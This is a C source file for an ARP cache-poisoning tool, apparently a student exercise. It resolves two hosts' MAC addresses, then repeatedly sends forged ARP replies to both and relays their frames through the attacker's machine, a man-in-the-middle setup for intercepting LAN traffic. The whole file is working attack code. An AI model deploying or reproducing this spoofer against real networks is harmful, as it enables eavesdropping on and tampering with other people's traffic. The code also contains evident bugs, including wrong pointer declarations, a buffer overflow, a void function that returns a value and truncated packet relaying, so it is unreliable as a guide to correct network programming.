#include <stdio.h>
#include <sys/ioctl.h>
#include <net/if.h> 
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>
#include <pcap.h>
#include <arpa/inet.h>    
#include <stdlib.h>
#include <pthread.h>
#include <string.h>

#define SIZE_ETHERNET 14
/* Ethernet header */
struct sniff_ethernet {
        
#define ETHER_ADDR_LEN 6
    u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
    u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
    u_short ether_type; /* IP? ARP? RARP? etc */
};


/* ARP Header, (assuming Ethernet+IPv4)            */ 
#define ARP_REQUEST 1   /* ARP Request             */ 
#define ARP_REPLY 2     /* ARP Reply               */ 
struct arphdr { 
    u_int16_t htype;    /* Hardware Type           */ 
    u_int16_t ptype;    /* Protocol Type           */ 
    u_char hlen;        /* Hardware Address Length */ 
    u_char plen;        /* Protocol Address Length */ 
    u_int16_t oper;     /* Operation Code          */ 
    u_char sha[6];      /* Sender hardware address */ 
    u_char spa[4];      /* Sender IP address       */ 
    u_char tha[6];      /* Target hardware address */ 
    u_char tpa[4];      /* Target IP address       */ 
};

struct argument {
    pcap_t* handle;
    u_char my_mac_address[6];
    struct in_addr* my_ip_addr;
    struct in_addr senderIP, targetIP;
};
/**************************************************************************************************
                                            get my mac address
***************************************************************************************************/
void get_my_mac(u_char* mac_address)
{
    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;
    int i;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) { /* handle error*/ };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else { /* handle error */ }
    }

    if (success) memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);
    
    else{
        printf("Cannot get my Mac address. please restart this program. \n");
        return 1;
    }

    printf("\n[+]My Mac Address : ");
    for(int i=0;i<6;i++)
    {
            printf("%02x",mac_address[i]);
            if(i != 5) printf(":");
        
    }
    printf("\n");
    close(sock);
}
/**************************************************************************************************
                                            get my ip address
***************************************************************************************************/
    void get_my_ip(struct in_addr* my_ip_addr,char* dev)
    {
        struct ifreq ifr;
        int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
        ifr.ifr_addr.sa_family = AF_INET;
        strncpy(ifr.ifr_name , dev , IFNAMSIZ - 1);
        ioctl(sock, SIOCGIFADDR, &ifr);
        struct in_addr my_ip_buf = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;

        printf("[+]My IP Address  : %s\n",inet_ntoa(my_ip_buf));

        memcpy(my_ip_addr,&my_ip_buf, 4);
    
        close(sock);
    }

/**************************************************************************************************
                                        make request packet
***************************************************************************************************/

    	u_char* mk_req_packet(u_char* s_mac, struct in_addr* s_ip, struct in_addr d_ip){
    	struct sniff_ethernet* eth;
    	struct arphdr* arp;
    	u_char* packet_tmp;
        
    	eth = (struct sniff_ethernet*)malloc(sizeof(struct sniff_ethernet));
    	arp = (struct arphdr*)malloc(sizeof(struct arphdr));
    	memcpy(eth->ether_dhost,"\xff\xff\xff\xff\xff\xff",ETHER_ADDR_LEN);
    	memcpy(eth->ether_shost,s_mac,ETHER_ADDR_LEN);
    	eth->ether_type = htons(0x0806);
    	arp->htype = htons(0x0001);
    	arp->ptype = htons(0x0800);
    	arp->hlen = 0x06;
    	arp->plen = 0x04;
    	arp->oper = htons(0x0001);
    	memcpy(arp->sha,s_mac,6);
    	memcpy(arp->spa,s_ip,4);
    	memcpy(arp->tha,"\x00\x00\x00\x00\x00\x00",6);
    	memcpy(arp->tpa,&d_ip,4);
	packet_tmp = (u_char*)malloc(sizeof(struct sniff_ethernet)+sizeof(struct arphdr));

    	memcpy(packet_tmp,eth,sizeof(struct sniff_ethernet));
    	memcpy(packet_tmp+sizeof(struct sniff_ethernet),arp,sizeof(struct arphdr));
       
    	return packet_tmp;
       
	}	

/**************************************************************************************************
                                        make reply packet
***************************************************************************************************/
	u_char* mk_rply_packet(u_char* s_mac, u_char* d_mac,struct in_addr s_ip,struct in_addr t_ip){
        struct sniff_ethernet* eth;
        struct arphdr* arp;
        u_char* packet_tmp;

        eth = (struct sniff_ethernet*)malloc(sizeof(struct sniff_ethernet));
        arp = (struct arphdr*)malloc(sizeof(struct arphdr));
        memcpy(eth->ether_dhost,d_mac,ETHER_ADDR_LEN);
        memcpy(eth->ether_shost,s_mac,ETHER_ADDR_LEN);
        eth->ether_type = htons(0x0806);
        arp->htype = htons(0x0001);
        arp->ptype = htons(0x0800);
        arp->hlen = 0x06;
        arp->plen = 0x04;
        arp->oper = htons(0x0002);
        memcpy(arp->sha,s_mac,6);
        memcpy(arp->spa,&t_ip,4);
        memcpy(arp->tha,d_mac,6);
        memcpy(arp->tpa,&s_ip,4);
        packet_tmp = (u_char*)malloc(sizeof(struct sniff_ethernet)+sizeof(struct arphdr));

        memcpy(packet_tmp,eth,sizeof(struct sniff_ethernet));
        memcpy(packet_tmp+sizeof(struct sniff_ethernet),arp,sizeof(struct arphdr));
        
        return packet_tmp;
       
    	}		

/**************************************************************************************************
                                modify (sender & target)'s arp table 
***************************************************************************************************/
    void modify_arpT(void *argument) {
        struct argument *arg;
        u_char* packet_req_s, packet_req_t;
        u_char* packet_rply_s, packet_rply_t;
        struct pcap_pkthdr* header;
        const u_char* recv_packet;
        struct sniff_ethernet* recv_eth;
        struct arphdr* recv_arp;
        u_char recv_mac_s[6];
        u_char recv_mac_t[6];
        u_char* recv_packet_tmp;
        int i;
        arg = (struct argument*) argument;

        packet_req_s = mk_req_packet(arg->my_mac_address, arg->my_ip_addr,arg->senderIP);
        
        if(pcap_sendpacket(arg->handle, packet_req_s, 60) != 0) {
            printf("Packet Send Error.\n");
            pthread_exit((void *) 0);
        }

        while (1) {
        int res = pcap_next_ex(arg->handle, &header, &recv_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        /*
            -1 if an error occurred 
            -2 if EOF was reached reading from an offline capture
        */
        recv_eth = (struct sniff_ethernet*)recv_packet;
        if(ntohs(recv_eth->ether_type) == 0x0806) //arp
        {
            recv_arp = (struct arphdr*)(recv_packet + SIZE_ETHERNET);

            if(ntohs(recv_arp->oper) == 0x0002)
            {
                char* ptr;
    
                u_char* ip_buf_tmp = (u_char*)malloc(4);
                sprintf(ip_buf_tmp, "%x%x%x%x",recv_arp->spa[3],recv_arp->spa[2],recv_arp->spa[1],recv_arp->spa[0]);
            
                if(arg->senderIP.s_addr == strtol(ip_buf_tmp,&ptr,16))
                {
                    printf("\n[*]ARP_REPLY![*]\n");
                    printf("\n[+]packet binary[+]");
                    for(i=0;i<60;i++)
                    {   
                        if(i%8 == 0) printf("\n");
                        printf("%02x ",recv_packet[i]);
                    }
                    printf("\n");
                    memcpy(recv_mac_s,recv_eth->ether_shost,6);
                    printf("\n[+]Sender's Mac Address : ");
                    for(i=0;i<6;i++)
                    {
                        printf("%02x",recv_mac_s[i]);
                        if(i != 5) printf(":");
          
                    }
                    printf("\n");
                    break;
                }
            }
        }
    }

    packet_req_t = mk_req_packet(arg->my_mac_address, arg->my_ip_addr,arg->targetIP);    

    if(pcap_sendpacket(arg->handle, packet_req_t, 60) != 0) {
            printf("Packet Send Error.\n");
             pthread_exit((void *) 0);
    }

    while (1) {
        int res = pcap_next_ex(arg->handle, &header, &recv_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        /*
            -1 if an error occurred 
            -2 if EOF was reached reading from an offline capture
        */
        recv_eth = (struct sniff_ethernet*)recv_packet;
        if(ntohs(recv_eth->ether_type) == 0x0806) //arp
        {
            recv_arp = (struct arphdr*)(recv_packet + SIZE_ETHERNET);

            if(ntohs(recv_arp->oper) == 0x0002)
            {
                char* ptr;
    
                u_char* ip_buf_tmp = (u_char*)malloc(4);
                sprintf(ip_buf_tmp, "%x%x%x%x",recv_arp->spa[3],recv_arp->spa[2],recv_arp->spa[1],recv_arp->spa[0]);
            
                if(arg->targetIP.s_addr == strtol(ip_buf_tmp,&ptr,16))
                {
                    printf("\n[*]ARP_REPLY![*]\n");
                    printf("\n[+]packet binary[+]");
                    for(i=0;i<60;i++)
                    {   
                        if(i%8 == 0) printf("\n");
                        printf("%02x ",recv_packet[i]);
                    }
                    printf("\n");
                    memcpy(recv_mac_t,recv_eth->ether_shost,6);
                    printf("\n[+]Sender's Mac Address : ");
                    for(i=0;i<6;i++)
                    {
                        printf("%02x",recv_mac_t[i]);
                        if(i != 5) printf(":");
          
                    }
                    printf("\n");
                    break;
                }
            }
        }
    }

    packet_rply_s = mk_rply_packet(arg->my_mac_address, recv_mac_s, arg->senderIP, arg->targetIP);
    packet_rply_t = mk_rply_packet(arg->my_mac_address, recv_mac_t, arg->targetIP, arg->senderIP);
    
    while(1)
    {
        if(pcap_sendpacket(arg->handle, packet_rply_s, 60) != 0)
            printf("Packet Send Error.\n");
    
        if(pcap_sendpacket(arg->handle, packet_rply_t, 60) != 0)
            printf("Packet Send Error.\n");

        int res = pcap_next_ex(arg->handle, &header, &recv_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        /*
            -1 if an error occurred 
            -2 if EOF was reached reading from an offline capture
        */
        recv_eth = (struct sniff_ethernet*)recv_packet;
        if(!memcmp(recv_eth->ether_shost, recv_mac_s, strlen(recv_mac_s))){
            recv_packet_tmp = (u_char*)recv_packet;
            memcpy(recv_packet_tmp, recv_mac_t, sizeof(recv_mac_t));
            memcpy(recv_packet_tmp + sizeof(recv_mac_t), arg->my_mac_address,sizeof(arg->my_mac_address));

            pcap_sendpacket(arg->handle,recv_packet_tmp,60);
        }
        else if(!memcmp(recv_eth->ether_shost,recv_mac_t,strlen(recv_mac_t))){
            recv_packet_tmp = (u_char*)recv_packet;
            memcpy(recv_packet_tmp,recv_mac_s, sizeof(recv_mac_s));
            memcpy(recv_packet_tmp + sizeof(recv_mac_s), arg->my_mac_address, sizeof(arg->my_mac_address));

            pcap_sendpacket(arg->handle, recv_packet_tmp,60);
        }
    }    
}
